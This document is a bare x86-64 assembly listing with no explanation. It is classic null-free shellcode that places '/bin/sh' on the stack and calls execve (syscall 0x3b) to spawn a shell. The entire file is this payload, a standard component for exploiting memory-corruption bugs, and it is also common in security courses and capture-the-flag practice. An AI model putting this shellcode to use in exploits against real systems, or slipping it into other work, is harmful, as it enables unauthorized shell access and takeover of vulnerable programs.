.text
.global _start
_start:
    xor %rax, %rax
    mov $0x68732f6e69622f2f, %rdi
    shr $0x8, %rdi
    push %rdi
    mov %rsp, %rdi
    xor %rax, %rax
    push %rax
    mov %rsp, %rsi
    push %rax
    mov %rsp, %rdx
    mov $0x3b, %al
    syscall  
